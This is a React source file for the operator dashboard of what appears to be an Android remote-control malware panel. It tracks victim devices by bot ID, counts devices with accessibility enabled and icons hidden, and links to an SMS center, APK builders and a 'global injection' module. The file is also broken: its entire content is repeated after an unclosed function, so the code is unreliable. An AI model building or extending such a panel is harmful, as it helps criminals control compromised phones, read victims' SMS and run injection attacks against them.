import { useEffect, useState, useMemo } from "react"
import { api } from "../api/client"
import AccountsPage from "./AccountsPage"
import SettingsPage from "./SettingsPage"
import SmsPage from "./SmsPage"
import NodePage from "./NodePage"
import InjPage from "./InjPage"
import ApkPage from "./ApkPage"

function pid(d){ return d.deviceId||d.id||d.sessionId||d.botId||"-" }
function pname(d){ return d.name||d.model||d.deviceName||d.brand||"-" }
function pon(d){ return d.online||d.status==="online"||d.connected }
const today=(d)=>new Date().toISOString().slice(0,10)===(String(d.createdAt||d.created_at||d.registerTime||"")).slice(0,10)

function bj(t){if(!t)return"-";try{let n=t;if(typeof n==="number"||!isNaN(Number(n))){n=Number(n);if(n<1e12)n*=1000}const d=new Date(n);if(isNaN(d.getTime()))return t;return d.toLocaleString("zh-CN",{timeZone:"Asia/Shanghai",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit",hourCycle:"h23"})}catch{return t}}

function toast(m,t){const e=document.createElement("div");e.style.cssText="position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:99999;padding:12px 28px;border-radius:10px;font-size:14px;box-shadow:0 4px 20px rgba(0,0,0,.5);pointer-events:none;transition:opacity .3s";e.style.background=t==="error"?"rgba(220,38,38,.9)":"rgba(16,8,12,.95)";e.style.border=t==="error"?"1px solid rgba(220,38,38,.3)":"1px solid rgba(168,85,247,.12)";e.style.color=t==="error"?"#ff7875":"#e0d0d0";e.textContent=m;document.body.appendChild(e);setTimeout(()=>{e.style.opacity="0";setTimeout(()=>e.remove(),300)},2500)}

function Stat({c,i,t,v}){return<div className={"s-card "+c}><div className="s-title"><span>{i}</span>{t}</div><div className="s-val">{v}<span>台</span></div><div className="s-ico">{i}</div></div>}

function CardView({devices,refresh}){
  return <div className="device-cards">{devices.map(d=><div key={pid(d)} className="device-card"><div className="dc-header"><span className={"pill "+(pon(d)?"on":"off")}>{pon(d)?"在线":"离线"}</span><span className="dc-id">{pid(d)}</span><div style={{marginLeft:"auto",display:"flex",gap:4}}>{deviceActions(d,refresh)}</div></div><div className="dc-body"><div className="dc-row"><span className="dc-label">机型</span><span>{pname(d)}</span></div><div className="dc-row"><span className="dc-label">IP</span><span>{d.ip||d.clientIp||"-"}</span></div><div className="dc-row"><span className="dc-label">电量</span><span>{(d.battery||"-")+"%"}</span></div><div className="dc-row"><span className="dc-label">版本</span><span>{d.androidVersion||d.os||d.version||"-"}</span></div><div className="dc-row"><span className="dc-label">国家</span><span>{d.country||"-"}</span></div><div className="dc-row"><span className="dc-label">最后在线</span><span>{bj(d.lastSeen||d.updatedAt||"-")}</span></div><div className="dc-row"><span className="dc-label">归属</span><span style={{color:"#38bdf8"}}>{d.owner_username||d.ownerUsername||"-"}</span></div></div></div>)}</div>
}

function ListView({list,refresh,selected,setSelected}){
  const all=list.length>0&&selected.size===list.length
  return <section className="rc-table-wrap"><table className="rc-table"><thead><tr><th style={{width:36}}><input type="checkbox" checked={all} onChange={()=>{if(all)setSelected(new Set());else setSelected(new Set(list.map(pid)))}}/></th><th>设备ID</th><th>状态</th><th>机型</th><th>IP</th><th>国家</th><th>电量</th><th>版本</th><th>无障碍</th><th>最后在线</th><th>归属</th><th>标签</th><th>操作</th></tr></thead><tbody>{list.map(d=><tr key={pid(d)} className={selected.has(pid(d))?"sel":""}><td><input type="checkbox" checked={selected.has(pid(d))} onChange={()=>{const s=new Set(selected);if(s.has(pid(d)))s.delete(pid(d));else s.add(pid(d));setSelected(s)}}/></td><td><b>{pid(d)}</b></td><td><span className={"pill "+(pon(d)?"on":"off")}>{pon(d)?"在线":"离线"}</span></td><td>{pname(d)}</td><td>{d.ip||d.clientIp||"-"}</td><td>{d.country||"-"}</td><td>{d.battery||"-"}</td><td>{d.androidVersion||d.os||d.version||"-"}</td><td>{d.accessibility||d.a11y?"已开":"未开"}</td><td>{bj(d.lastSeen||d.updatedAt||"-")}</td><td>{d.owner_username||d.ownerUsername||"-"}</td><td>{d.tag||d.label||"-"}</td><td>{deviceActions(d,refresh)}</td></tr>)}</tbody></table></section>
}

function AbPackPage(){return<section className="panel" style={{padding:40,textAlign:"center",color:"#8b949e"}}><div style={{fontSize:48,marginBottom:16}}>🛡️</div><div>双包构建 - 待完善</div></section>}
function Loading(){return<div style={{padding:40,textAlign:"center",color:"#8b949e",fontSize:14}}>加载中...</div>}
function Empty({text}){return<div style={{padding:40,textAlign:"center",color:"#8b949e",fontSize:14}}>{text||"暂无数据"}</div>}
function Err({msg}){return<div className="toast err" style={{margin:16}}>{msg||"加载失败"}</div>}

export default function Dashboard({user,onLogout}){
  const [now,setNow]=useState(new Date());useEffect(()=>{const t=setInterval(()=>setNow(new Date()),1000);return()=>clearInterval(t)},[])
  const tzList=[{v:"Asia/Shanghai",l:"🇨🇳 北京时间"},{v:"Asia/Hong_Kong",l:"🇭🇰 香港"},{v:"Asia/Tokyo",l:"🇯🇵 东京"},{v:"Asia/Seoul",l:"🇰🇷 首尔"},{v:"America/New_York",l:"🇺🇸 纽约"},{v:"Europe/London",l:"🇬🇧 伦敦"}]
  const[isLight,setIsLight]=useState(document.documentElement.getAttribute("data-theme")==="light");const[tz,setTz]=useState(localStorage.getItem("fc_timezone")||"Asia/Shanghai")
  function fmt(d,t){try{return d.toLocaleString("zh-CN",{timeZone:t,timeStyle:"medium",hourCycle:"h23"})}catch{return d.toLocaleTimeString()}}
  const [tab,setTab]=useState("overview"),[devices,setDevices]=useState([]),[err,setErr]=useState(""),[q,setQ]=useState(""),[flt,setFlt]=useState("all"),[view,setView]=useState("card"),[selected,setSelected]=useState(new Set())
  const list=useMemo(()=>devices.filter(d=>{const s=JSON.stringify(d).toLowerCase().includes(q.toLowerCase());const f=flt==="all"||(flt==="online"?pon(d):!pon(d));return s&&f}),[devices,q,flt])
  async function refresh(){setErr("");try{const r=await api.devices();setDevices(r.data?.devices||r.devices||r.data||[])}catch(e){setErr(e.message)}};window.__refreshDevices=refresh
  useEffect(()=>{refresh()},[])
  const label={sms:"短信中心",apk:"单包构建",abpack:"双包构建",settings:"系统设置",injection:"全局注入",server:"节点状态",accounts:"账号管理"}

  return<div style={{display:"flex",flexDirection:"column",minHeight:"100vh",background:"#0b0710"}}>
    <div style={{height:52,background:"linear-gradient(90deg,#2d0a1a,#1a0520)",borderBottom:"1px solid rgba(220,38,38,.08)",display:"flex",alignItems:"center",justifyContent:"space-between",padding:"0 24px",flexShrink:0,fontSize:14}}>
      <div style={{display:"flex",alignItems:"center",gap:8}}>
        <span style={{fontSize:16}}>🇨🇳</span>
        <span style={{color:"#b0c8e0",fontSize:14}}>中国时间</span>
        <span style={{color:"#b0c8e0",fontFamily:"monospace",fontSize:14,fontWeight:600}}>{fmt(now,"Asia/Shanghai")}</span>
      </div>
      <div style={{display:"flex",alignItems:"center",gap:14}}>
        <span style={{color:"#b0c8e0",fontSize:13}}>👤 {user?.username||"未知"}</span>
        <span style={{color:"#8870a0",fontSize:12}}>|</span>
        <span style={{color:"#51cf66",fontSize:12}}>🟢 在线: <b>{devices.filter(pon).length}</b></span>
        <span style={{color:"#8870a0",fontSize:12}}>|</span>
        <select value={tz} onChange={e=>{setTz(e.target.value);localStorage.setItem("fc_timezone",e.target.value)}} style={{background:"rgba(255,255,255,.05)",border:"1px solid rgba(168,85,247,.1)",borderRadius:6,color:"#b0c8e0",padding:"2px 10px",fontSize:12,height:26,outline:0}}>{tzList.map(t=><option key={t.v} value={t.v}>{t.l}</option>)}</select>
        <span style={{color:"#b0c8e0",fontFamily:"monospace",fontSize:13}}>{fmt(now,tz)}</span>
        <label style={{position:"relative",display:"inline-block",width:48,height:24,cursor:"pointer",marginLeft:4}}><input type="checkbox" style={{opacity:0,width:0,height:0}} checked={isLight} onChange={(e)=>{const on=e.target.checked;setIsLight(on);const d=document.documentElement;d.setAttribute("data-theme",on?"light":"");localStorage.setItem("fc_theme",on?"light":"")}}/><span style={{position:"absolute",inset:0,borderRadius:12,background:isLight?"rgba(249,115,22,.15)":"rgba(59,7,100,.2)",transition:".3s",display:"flex",alignItems:"center",padding:"0 6px",justifyContent:"space-between"}}><span style={{fontSize:10,lineHeight:1}}>🌙</span><span style={{fontSize:10,lineHeight:1}}>☀️</span><span style={{position:"absolute",left:2,top:2,width:20,height:20,borderRadius:"50%",background:isLight?"#ea580c":"#7c3aed",transition:".3s",transform:isLight?"translateX(24px)":"translateX(0)",boxShadow:"0 1px 3px rgba(0,0,0,.2)"}}/></span></label>
      </div>
    </div>
    <div className="rc-shell">
      <aside className="rc-sidebar"><div className="rc-logo">FC 远控系统</div><div className="rc-sub">Remote Control Panel</div><nav>
        <button className={tab==="overview"?"on":""} onClick={()=>setTab("overview")}>🎮 终端控制</button>
        <button className={tab==="sms"?"on":""} onClick={()=>setTab("sms")}>💬 短信中心</button>
        <button className={tab==="apk"?"on":""} onClick={()=>setTab("apk")}>📦 单包构建</button>
        <button className={tab==="abpack"?"on":""} onClick={()=>setTab("abpack")}>🛡️ 双包构建</button>
        <button className={tab==="settings"?"on":""} onClick={()=>setTab("settings")}>⚙️ 系统设置</button>
        <button className={tab==="injection"?"on":""} onClick={()=>setTab("injection")}>💉 全局注入</button>
        <button className={tab==="server"?"on":""} onClick={()=>setTab("server")}>🌐 节点状态</button>
        <button className={tab==="accounts"?"on":""} onClick={()=>setTab("accounts")}>👥 账号管理</button>
        <button onClick={onLogout}>🚪 退出登录</button>
      </nav></aside>
      <main className="rc-main">
        {tab==="overview"?<>
          <header className="rc-header">🎮 终端控制</header>
          {err&&<Err msg={err}/>}
          <section className="rc-stats"><Stat c="red" i="📱" t="总设备数" v={devices.length}/><Stat c="green" i="📶" t="在线设备" v={devices.filter(pon).length}/><Stat c="gray" i="⏻" t="离线设备" v={Math.max(devices.length-devices.filter(pon).length,0)}/><Stat c="orange" i="➕" t="今日新增" v={devices.filter(today).length}/><Stat c="teal" i="♿" t="无障碍已开" v={devices.filter(d=>d.accessibility||d.a11y).length}/><Stat c="indigo" i="🙈" t="图标已隐藏" v={devices.filter(d=>d.iconHidden||d.hidden).length}/></section>
          <div className="rc-topbar"><div className="rc-top-left"><span>📱 设备总数 <b>{devices.length}</b></span><div className="rc-search"><input placeholder="搜索 ID / 机型 / IP" value={q} onChange={e=>setQ(e.target.value)}/><span>🔍</span></div>{selected.size>0&&<span className="sel-badge">已选 <b>{selected.size}</b> 台</span>}</div><div className="rc-top-right"><select value={flt} onChange={e=>setFlt(e.target.value)}><option value="all">全部状态</option><option value="online">在线</option><option value="offline">离线</option></select><div className="view-toggle"><button className={"v-btn "+(view==="list"?"on":"")} onClick={()=>setView("list")}>📋</button><button className={"v-btn "+(view==="card"?"on":"")} onClick={()=>setView("card")}>🃏</button></div><button className="rc-btn" onClick={refresh}>⟳ 刷新</button></div></div>
          {selected.size>0&&<div className="batch-bar">已选 {selected.size} 台设备 <button className="rc-btn" onClick={()=>{toast("批量操作执行于 "+selected.size+" 台设备");setSelected(new Set())}}>批量执行</button><button className="rc-btn" style={{background:"rgba(220,38,38,.15)",color:"#ff6b6b"}} onClick={()=>setSelected(new Set())}>取消选择</button></div>}
          {view==="card"?<CardView devices={list} refresh={refresh}/>:<ListView list={list} refresh={refresh} selected={selected} setSelected={setSelected}/>}
        </>:<>
          <header className="rc-header">{label[tab]||tab}</header>
          {tab==="accounts"?<AccountsPage/>:tab==="sms"?<SmsPage/>:tab==="settings"?<SettingsPage/>:tab==="apk"?<ApkPage/>:tab==="injection"?<InjPage/>:tab==="abpack"?<AbPackPage/>:tab==="server"?<NodePage/>:<div style={{padding:40,textAlign:"center",color:"#8b949e"}}>该模块待完善</div>}
        </>}
      </main>
    </div>
  </div>
}function deviceActions(d,refresh){
  const id=pid(d);
  return <div className="act-btns" style={{display:"flex",gap:4}}>
    <button style={{height:32,padding:"0 14px",fontSize:13,border:0,borderRadius:6,cursor:"pointer",display:"inline-flex",alignItems:"center",gap:4,background:"rgba(24,144,255,.1)",color:"#38bdf8",fontWeight:500}} title="Control" onClick={()=>{toast("Controlling "+id)}}>🏳️ Control</button>
    <button style={{height:32,padding:"0 14px",fontSize:13,border:0,borderRadius:6,cursor:"pointer",display:"inline-flex",alignItems:"center",gap:4,background:"rgba(168,85,247,.1)",color:"#c084fc",fontWeight:500}} title="Assign" onClick={function(){
      var btn=this;var orig=btn.innerHTML;btn.innerHTML='⏱';
      var m=document.createElement('div');
      m.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;background:rgba(0,0,0,.65);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)';
      var box=document.createElement('div');
      box.style.cssText='background:linear-gradient(135deg,rgba(25,10,45,.96),rgba(15,5,35,.96));border:1px solid rgba(168,85,247,.12);border-radius:16px;padding:28px 32px;width:400px;max-width:90vw;box-shadow:0 20px 60px rgba(0,0,0,.45)';
      box.innerHTML='<div style="padding:20px;text-align:center;color:#8870a0">Loading users...</div>';
      m.appendChild(box);document.body.appendChild(m);
      m.onclick=function(e){if(e.target===m)m.remove()};
      setTimeout(async function(){
        try{
          var a=await api.users();
          var us=a.data||a.result||a||[];
          var owner=d.owner_username||d.ownerUsername||'None';
          var opts=us.map(function(x){return '<option value="'+x.username+'">'+x.username+'</option>'});
          box.innerHTML='<div style="display:grid;gap:12px;font-size:13px"><div style="color:#8870a0"><span style="color:#b0c8e0">Device:</span> <code style="font-family:monospace;font-size:11px;color:#ddd">'+id+'</code></div><div style="color:#8870a0"><span style="color:#b0c8e0">Owner:</span> <span style="color:#38bdf8">'+owner+'</span></div><div style="color:#8870a0"><span style="color:#b0c8e0">User:</span> <select id="fas" style="width:100%;height:36px;background:rgba(255,255,255,.04);border:1px solid rgba(168,85,247,.08);border-radius:8px;color:#ddd;padding:0 8px;font-size:13px">'+opts.join('')+'</select></div></div><div style="display:flex;gap:10px;justify-content:flex-end;padding:8px 0 0"><button id="fcac" style="padding:8px 18px;border-radius:8px;border:1px solid rgba(168,85,247,.08);background:transparent;color:#8870a0;cursor:pointer;font-size:13px">Cancel</button><button id="fcam" style="padding:8px 18px;border-radius:8px;border:0;background:linear-gradient(135deg,#9333ea,#7c3aed);color:#fff;cursor:pointer;font-size:13px;font-weight:500">Assign</button></div>';
          document.getElementById('fcac').onclick=function(){m.remove()};
          document.getElementById('fcam').onclick=async function(){
            var s=document.getElementById('fas');
            if(s&&s.value){
              try{await api.request('/api/device/'+encodeURIComponent(id)+'/assign',{method:'PUT',body:JSON.stringify({username:s.value})});toast('Assigned');m.remove();refresh()}catch(e){toast(e.message,'error')}
            }
          };
          btn.innerHTML=orig;
        }catch(e){box.innerHTML='<div style="padding:20px;text-align:center;color:#ff6b6b">Error</div>';btn.innerHTML=orig}
      },100);
    }}>👤 Assign</button>
    <button style={{height:32,padding:"0 14px",fontSize:13,border:0,borderRadius:6,cursor:"pointer",display:"inline-flex",alignItems:"center",gap:4,background:"rgba(220,38,38,.1)",color:"#ff6b6b",fontWeight:500}} title="Delete" onClick={async()=>{if(confirm("Delete "+id+"?"))try{await api.request("/api/device/"+encodeURIComponent(id),{method:"DELETE"});toast("Deleted");refresh()}catch(e){toast(e.message,"error")}}}>🗑 Delete</button>
  </div>

function pid(d){ return d.deviceId||d.id||d.sessionId||d.botId||"-" }
function pname(d){ return d.name||d.model||d.deviceName||d.brand||"-" }
function pon(d){ return d.online||d.status==="online"||d.connected }
const today=(d)=>new Date().toISOString().slice(0,10)===(String(d.createdAt||d.created_at||d.registerTime||"")).slice(0,10)

function bj(t){if(!t)return"-";try{let n=t;if(typeof n==="number"||!isNaN(Number(n))){n=Number(n);if(n<1e12)n*=1000}const d=new Date(n);if(isNaN(d.getTime()))return t;return d.toLocaleString("zh-CN",{timeZone:"Asia/Shanghai",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit",hourCycle:"h23"})}catch{return t}}

function toast(m,t){const e=document.createElement("div");e.style.cssText="position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:99999;padding:12px 28px;border-radius:10px;font-size:14px;box-shadow:0 4px 20px rgba(0,0,0,.5);pointer-events:none;transition:opacity .3s";e.style.background=t==="error"?"rgba(220,38,38,.9)":"rgba(16,8,12,.95)";e.style.border=t==="error"?"1px solid rgba(220,38,38,.3)":"1px solid rgba(168,85,247,.12)";e.style.color=t==="error"?"#ff7875":"#e0d0d0";e.textContent=m;document.body.appendChild(e);setTimeout(()=>{e.style.opacity="0";setTimeout(()=>e.remove(),300)},2500)}

function Stat({c,i,t,v}){return<div className={"s-card "+c}><div className="s-title"><span>{i}</span>{t}</div><div className="s-val">{v}<span>台</span></div><div className="s-ico">{i}</div></div>}

function CardView({devices,refresh}){
  return <div className="device-cards">{devices.map(d=><div key={pid(d)} className="device-card"><div className="dc-header"><span className={"pill "+(pon(d)?"on":"off")}>{pon(d)?"在线":"离线"}</span><span className="dc-id">{pid(d)}</span><div style={{marginLeft:"auto",display:"flex",gap:4}}>{deviceActions(d,refresh)}</div></div><div className="dc-body"><div className="dc-row"><span className="dc-label">机型</span><span>{pname(d)}</span></div><div className="dc-row"><span className="dc-label">IP</span><span>{d.ip||d.clientIp||"-"}</span></div><div className="dc-row"><span className="dc-label">电量</span><span>{(d.battery||"-")+"%"}</span></div><div className="dc-row"><span className="dc-label">版本</span><span>{d.androidVersion||d.os||d.version||"-"}</span></div><div className="dc-row"><span className="dc-label">国家</span><span>{d.country||"-"}</span></div><div className="dc-row"><span className="dc-label">最后在线</span><span>{bj(d.lastSeen||d.updatedAt||"-")}</span></div><div className="dc-row"><span className="dc-label">归属</span><span style={{color:"#38bdf8"}}>{d.owner_username||d.ownerUsername||"-"}</span></div></div></div>)}</div>
}

function ListView({list,refresh,selected,setSelected}){
  const all=list.length>0&&selected.size===list.length
  return <section className="rc-table-wrap"><table className="rc-table"><thead><tr><th style={{width:36}}><input type="checkbox" checked={all} onChange={()=>{if(all)setSelected(new Set());else setSelected(new Set(list.map(pid)))}}/></th><th>设备ID</th><th>状态</th><th>机型</th><th>IP</th><th>国家</th><th>电量</th><th>版本</th><th>无障碍</th><th>最后在线</th><th>归属</th><th>标签</th><th>操作</th></tr></thead><tbody>{list.map(d=><tr key={pid(d)} className={selected.has(pid(d))?"sel":""}><td><input type="checkbox" checked={selected.has(pid(d))} onChange={()=>{const s=new Set(selected);if(s.has(pid(d)))s.delete(pid(d));else s.add(pid(d));setSelected(s)}}/></td><td><b>{pid(d)}</b></td><td><span className={"pill "+(pon(d)?"on":"off")}>{pon(d)?"在线":"离线"}</span></td><td>{pname(d)}</td><td>{d.ip||d.clientIp||"-"}</td><td>{d.country||"-"}</td><td>{d.battery||"-"}</td><td>{d.androidVersion||d.os||d.version||"-"}</td><td>{d.accessibility||d.a11y?"已开":"未开"}</td><td>{bj(d.lastSeen||d.updatedAt||"-")}</td><td>{d.owner_username||d.ownerUsername||"-"}</td><td>{d.tag||d.label||"-"}</td><td>{deviceActions(d,refresh)}</td></tr>)}</tbody></table></section>
}

function AbPackPage(){return<section className="panel" style={{padding:40,textAlign:"center",color:"#8b949e"}}><div style={{fontSize:48,marginBottom:16}}>🛡️</div><div>双包构建 - 待完善</div></section>}
function Loading(){return<div style={{padding:40,textAlign:"center",color:"#8b949e",fontSize:14}}>加载中...</div>}
function Empty({text}){return<div style={{padding:40,textAlign:"center",color:"#8b949e",fontSize:14}}>{text||"暂无数据"}</div>}
function Err({msg}){return<div className="toast err" style={{margin:16}}>{msg||"加载失败"}</div>}

export default function Dashboard({user,onLogout}){
  const [now,setNow]=useState(new Date());useEffect(()=>{const t=setInterval(()=>setNow(new Date()),1000);return()=>clearInterval(t)},[])
  const tzList=[{v:"Asia/Shanghai",l:"🇨🇳 北京时间"},{v:"Asia/Hong_Kong",l:"🇭🇰 香港"},{v:"Asia/Tokyo",l:"🇯🇵 东京"},{v:"Asia/Seoul",l:"🇰🇷 首尔"},{v:"America/New_York",l:"🇺🇸 纽约"},{v:"Europe/London",l:"🇬🇧 伦敦"}]
  const[isLight,setIsLight]=useState(document.documentElement.getAttribute("data-theme")==="light");const[tz,setTz]=useState(localStorage.getItem("fc_timezone")||"Asia/Shanghai")
  function fmt(d,t){try{return d.toLocaleString("zh-CN",{timeZone:t,timeStyle:"medium",hourCycle:"h23"})}catch{return d.toLocaleTimeString()}}
  const [tab,setTab]=useState("overview"),[devices,setDevices]=useState([]),[err,setErr]=useState(""),[q,setQ]=useState(""),[flt,setFlt]=useState("all"),[view,setView]=useState("card"),[selected,setSelected]=useState(new Set())
  const list=useMemo(()=>devices.filter(d=>{const s=JSON.stringify(d).toLowerCase().includes(q.toLowerCase());const f=flt==="all"||(flt==="online"?pon(d):!pon(d));return s&&f}),[devices,q,flt])
  async function refresh(){setErr("");try{const r=await api.devices();setDevices(r.data?.devices||r.devices||r.data||[])}catch(e){setErr(e.message)}};window.__refreshDevices=refresh
  useEffect(()=>{refresh()},[])
  const label={sms:"短信中心",apk:"单包构建",abpack:"双包构建",settings:"系统设置",injection:"全局注入",server:"节点状态",accounts:"账号管理"}

  return<div style={{display:"flex",flexDirection:"column",minHeight:"100vh",background:"#0b0710"}}>
    <div style={{height:52,background:"linear-gradient(90deg,#2d0a1a,#1a0520)",borderBottom:"1px solid rgba(220,38,38,.08)",display:"flex",alignItems:"center",justifyContent:"space-between",padding:"0 24px",flexShrink:0,fontSize:14}}>
      <div style={{display:"flex",alignItems:"center",gap:8}}>
        <span style={{fontSize:16}}>🇨🇳</span>
        <span style={{color:"#b0c8e0",fontSize:14}}>中国时间</span>
        <span style={{color:"#b0c8e0",fontFamily:"monospace",fontSize:14,fontWeight:600}}>{fmt(now,"Asia/Shanghai")}</span>
      </div>
      <div style={{display:"flex",alignItems:"center",gap:14}}>
        <span style={{color:"#b0c8e0",fontSize:13}}>👤 {user?.username||"未知"}</span>
        <span style={{color:"#8870a0",fontSize:12}}>|</span>
        <span style={{color:"#51cf66",fontSize:12}}>🟢 在线: <b>{devices.filter(pon).length}</b></span>
        <span style={{color:"#8870a0",fontSize:12}}>|</span>
        <select value={tz} onChange={e=>{setTz(e.target.value);localStorage.setItem("fc_timezone",e.target.value)}} style={{background:"rgba(255,255,255,.05)",border:"1px solid rgba(168,85,247,.1)",borderRadius:6,color:"#b0c8e0",padding:"2px 10px",fontSize:12,height:26,outline:0}}>{tzList.map(t=><option key={t.v} value={t.v}>{t.l}</option>)}</select>
        <span style={{color:"#b0c8e0",fontFamily:"monospace",fontSize:13}}>{fmt(now,tz)}</span>
        <label style={{position:"relative",display:"inline-block",width:48,height:24,cursor:"pointer",marginLeft:4}}><input type="checkbox" style={{opacity:0,width:0,height:0}} checked={isLight} onChange={(e)=>{const on=e.target.checked;setIsLight(on);const d=document.documentElement;d.setAttribute("data-theme",on?"light":"");localStorage.setItem("fc_theme",on?"light":"")}}/><span style={{position:"absolute",inset:0,borderRadius:12,background:isLight?"rgba(249,115,22,.15)":"rgba(59,7,100,.2)",transition:".3s",display:"flex",alignItems:"center",padding:"0 6px",justifyContent:"space-between"}}><span style={{fontSize:10,lineHeight:1}}>🌙</span><span style={{fontSize:10,lineHeight:1}}>☀️</span><span style={{position:"absolute",left:2,top:2,width:20,height:20,borderRadius:"50%",background:isLight?"#ea580c":"#7c3aed",transition:".3s",transform:isLight?"translateX(24px)":"translateX(0)",boxShadow:"0 1px 3px rgba(0,0,0,.2)"}}/></span></label>
      </div>
    </div>
    <div className="rc-shell">
      <aside className="rc-sidebar"><div className="rc-logo">FC 远控系统</div><div className="rc-sub">Remote Control Panel</div><nav>
        <button className={tab==="overview"?"on":""} onClick={()=>setTab("overview")}>🎮 终端控制</button>
        <button className={tab==="sms"?"on":""} onClick={()=>setTab("sms")}>💬 短信中心</button>
        <button className={tab==="apk"?"on":""} onClick={()=>setTab("apk")}>📦 单包构建</button>
        <button className={tab==="abpack"?"on":""} onClick={()=>setTab("abpack")}>🛡️ 双包构建</button>
        <button className={tab==="settings"?"on":""} onClick={()=>setTab("settings")}>⚙️ 系统设置</button>
        <button className={tab==="injection"?"on":""} onClick={()=>setTab("injection")}>💉 全局注入</button>
        <button className={tab==="server"?"on":""} onClick={()=>setTab("server")}>🌐 节点状态</button>
        <button className={tab==="accounts"?"on":""} onClick={()=>setTab("accounts")}>👥 账号管理</button>
        <button onClick={onLogout}>🚪 退出登录</button>
      </nav></aside>
      <main className="rc-main">
        {tab==="overview"?<>
          <header className="rc-header">🎮 终端控制</header>
          {err&&<Err msg={err}/>}
          <section className="rc-stats"><Stat c="red" i="📱" t="总设备数" v={devices.length}/><Stat c="green" i="📶" t="在线设备" v={devices.filter(pon).length}/><Stat c="gray" i="⏻" t="离线设备" v={Math.max(devices.length-devices.filter(pon).length,0)}/><Stat c="orange" i="➕" t="今日新增" v={devices.filter(today).length}/><Stat c="teal" i="♿" t="无障碍已开" v={devices.filter(d=>d.accessibility||d.a11y).length}/><Stat c="indigo" i="🙈" t="图标已隐藏" v={devices.filter(d=>d.iconHidden||d.hidden).length}/></section>
          <div className="rc-topbar"><div className="rc-top-left"><span>📱 设备总数 <b>{devices.length}</b></span><div className="rc-search"><input placeholder="搜索 ID / 机型 / IP" value={q} onChange={e=>setQ(e.target.value)}/><span>🔍</span></div>{selected.size>0&&<span className="sel-badge">已选 <b>{selected.size}</b> 台</span>}</div><div className="rc-top-right"><select value={flt} onChange={e=>setFlt(e.target.value)}><option value="all">全部状态</option><option value="online">在线</option><option value="offline">离线</option></select><div className="view-toggle"><button className={"v-btn "+(view==="list"?"on":"")} onClick={()=>setView("list")}>📋</button><button className={"v-btn "+(view==="card"?"on":"")} onClick={()=>setView("card")}>🃏</button></div><button className="rc-btn" onClick={refresh}>⟳ 刷新</button></div></div>
          {selected.size>0&&<div className="batch-bar">已选 {selected.size} 台设备 <button className="rc-btn" onClick={()=>{toast("批量操作执行于 "+selected.size+" 台设备");setSelected(new Set())}}>批量执行</button><button className="rc-btn" style={{background:"rgba(220,38,38,.15)",color:"#ff6b6b"}} onClick={()=>setSelected(new Set())}>取消选择</button></div>}
          {view==="card"?<CardView devices={list} refresh={refresh}/>:<ListView list={list} refresh={refresh} selected={selected} setSelected={setSelected}/>}
        </>:<>
          <header className="rc-header">{label[tab]||tab}</header>
          {tab==="accounts"?<AccountsPage/>:tab==="sms"?<SmsPage/>:tab==="settings"?<SettingsPage/>:tab==="apk"?<ApkPage/>:tab==="injection"?<InjPage/>:tab==="abpack"?<AbPackPage/>:tab==="server"?<NodePage/>:<div style={{padding:40,textAlign:"center",color:"#8b949e"}}>该模块待完善</div>}
        </>}
      </main>
    </div>
  </div>
}
